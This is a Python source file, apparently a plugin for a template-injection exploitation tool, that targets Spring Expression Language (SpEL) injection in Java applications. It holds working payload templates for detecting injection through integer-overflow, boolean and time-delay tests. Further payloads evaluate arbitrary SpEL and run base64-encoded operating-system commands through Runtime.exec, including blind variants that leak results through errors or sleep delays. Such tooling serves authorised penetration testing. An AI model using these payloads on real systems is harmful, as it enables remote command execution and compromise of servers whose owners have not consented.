from plugins.languages import java
from utils import rand


class SpEL(java.Java):
    priority = 5
    generic_plugin = True
    plugin_info = {
        "Description": """Spring framework Expression Language (SpEL) injection in Java.""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'call': 'inject',
                'render': """{code}""",
                'header': """({header[0]}+{header[1]})+''+(""",
                'trailer': """)+''+({trailer[0]}+{trailer[1]})+''""",
                'wrapper_type': "global",
                'test_render': f"""'{rand.randstrings[0]}'+(T(java.lang.Integer).valueOf('2000000000')+2000000000)+'{rand.randstrings[1]}'""",
                'test_render_expected': f'{rand.randstrings[0]}-294967296{rand.randstrings[1]}'
            },
            'render_error': {
                'call': 'inject',
                'render': """{code}""",
                'header': """T(java.lang.Integer).valueOf(({header[0]}+{header[1]})+''+(""",
                'trailer': """)+''+({trailer[0]}+{trailer[1]})+'ZZ')""",
                'wrapper_type': "global",
                'test_render': f"""'{rand.randstrings[0]}'+(T(java.lang.Integer).valueOf('2000000000')+2000000000)+'{rand.randstrings[1]}'""",
                'test_render_expected': f'{rand.randstrings[0]}-294967296{rand.randstrings[1]}'
            },
            'boolean': {
                'call': 'inject',
                'test_bool_true':  "(T(java.lang.Integer).valueOf('1')/((1000000000+1000000000==2000000000)?1:0)+'')",
                'test_bool_false': "(T(java.lang.Integer).valueOf('1')/((1000000000+2000000000==1000000000)?1:0)+'')",
                'verify_bool_true':  "(T(java.lang.Integer).valueOf('1')/((2000000000+2000000000==-294967296)?1:0)+'')",
                'verify_bool_false': "(T(java.lang.Integer).valueOf('1')/((2000000000+2000000000==-224667999)?1:0)+'')"
            },
            'evaluate': {
                'call': 'render',
                'evaluate': """T(org.springframework.expression.spel.standard.SpelExpressionParser).newInstance().parseExpression(T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.util.Base64).getDecoder().decode("{code_b64p}"))).getValue().toString()""",
                'test_eval': '"executed".replace("xecu", "valua")',
                'test_eval_expected': 'evaluated'
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """(1/((!T(org.springframework.expression.spel.standard.SpelExpressionParser).newInstance().parseExpression(T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.util.Base64).getDecoder().decode("{code_b64p}"))).getValue().equals(false))?1:0)+'')""",
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """((!T(org.springframework.expression.spel.standard.SpelExpressionParser).newInstance().parseExpression(T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.util.Base64).getDecoder().decode("{code_b64p}"))).getValue().equals(false))?T(java.lang.Thread).sleep({delay}000):0).toString()""",
            },
            'execute': {
                'call': 'render',
                'execute': """T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.util.Base64).getDecoder().decode("{code_b64p}"))).inputStream.readAllBytes())""",
            },
            'execute_boolean': {
                'call': 'inject',
                'execute_blind': """(1/((T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.util.Base64).getDecoder().decode("{code_b64p}"))).waitFor()==0)?1:0)+'')""",
            },
            'execute_blind': {
                'call': 'inject',
                'execute_blind': """(T(java.lang.Runtime).getRuntime().exec(T(java.lang.String).getConstructor(T(byte[])).newInstance(T(java.util.Base64).getDecoder().decode("{code_b64p}"))).waitFor().equals(0)?T(java.lang.Thread).sleep({delay}000):0).toString()""",
            }
        })

        self.set_contexts([
            # Expression and template contexts
            {'level': 0, 'wrappers': ["{code}", "#{{{code}}}"]},
            {'level': 1, 'prefix': '{closure}+', 'suffix': '+{rclosure}', 'closures': java.ctx_closures},
            # Rare cases, as above works inside expressions
            {'level': 3, 'prefix': '{closure}}}#{{', 'suffix': '}}#{{{rclosure}', 'closures': java.ctx_closures},
        ])

        self.language += ':spel'
